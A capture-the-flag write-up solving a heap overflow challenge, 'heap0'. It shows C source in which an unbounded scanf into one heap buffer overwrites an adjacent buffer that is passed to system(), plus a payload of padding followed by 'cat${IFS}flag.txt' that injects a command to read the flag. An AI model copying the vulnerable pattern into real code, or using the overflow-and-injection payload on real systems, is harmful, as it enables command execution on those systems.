# heap0

Both a binary and a C source file were given.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
	char* username = malloc(50);
	char* shell = malloc(50);
	
	printf("username at %p\n", username);
	printf("shell at %p\n", shell);
	
	strcpy(shell, "/bin/ls");
	
	printf("Enter username: ");
	scanf("%s", username);
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
	
	return 0;
}
```
We run the program first.

```
username at 0x57606008
shell at 0x57606040
Enter username: i_like_cookies
Hello, i_like_cookies. Your shell is /bin/ls.
flag.txt
heap0
^C
```
It can be seen that two strings, username and shell, have been dynamically allocated on the heap. Their memory addresses were printed out, showing that their locations in memory are adjacent to each other.

The program also calls ```system``` to execute a command, which is to be changed in order to read the contents of the ```flag.txt``` file.


### The exploit 
```scanf()``` here does not check for an input size. To overwrite the contents of the ```shell```, we first fill up the username with 50 of any character, and any subsequent input will overwrite the shell command.

Reading the file is done with ```cat flag.txt``` - let us try this now.

```
username at 0x579dd008
shell at 0x579dd040
Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag.txt
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat. Your shell is cat.
```
My shell should have been ```cat flag.txt```, but ```flag.txt``` did not show up. After some Googling, it turns out that [scanf does not read any characters after a white space character](https://stackoverflow.com/questions/1247989/how-do-you-allow-spaces-to-be-entered-using-scanf).

This can be circumvented using [a special sequence which is equivalent to a space character](https://medium.com/csg-govtech/a-simple-os-command-injection-challenge-5acf92799f74), ```${IFS}```.

**Solution**
```
username at 0x57fde008
shell at 0x57fde040
Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat${IFS}flag.txt
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat${IFS}flag.txt. Your shell is cat${IFS}flag.txt.
```

**Flag**
```
flag{heap_challenges_are_not_as_scary_as_most_people_think}
```
